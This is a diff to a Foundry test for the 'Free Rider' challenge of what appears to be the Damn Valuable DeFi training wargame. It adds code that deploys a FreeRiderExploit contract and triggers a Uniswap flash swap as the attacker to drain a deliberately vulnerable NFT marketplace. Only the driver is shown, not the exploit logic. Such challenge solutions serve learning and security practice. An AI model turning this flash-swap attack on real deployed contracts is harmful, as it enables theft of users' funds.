@@ -9,6 +9,7 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {FreeRiderExploit} from "../../../src/Contracts/free-rider/FreeRiderExploit.sol";
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -150,6 +151,19 @@ contract FreeRider is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        FreeRiderExploit exploit = new FreeRiderExploit(
+            address(weth),
+            address(uniswapV2Pair),
+            address(freeRiderNFTMarketplace),
+            address(freeRiderBuyer),
+            address(damnValuableNFT)
+        );
+        vm.label(address(exploit), "Exploit Contract");
+        // Second param here is to define tx.origin
+        // See tx.origin check on the FreeRiderBuyer contract.
+        vm.startPrank(attacker, attacker);
+        exploit.flashSwap(15 ether);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
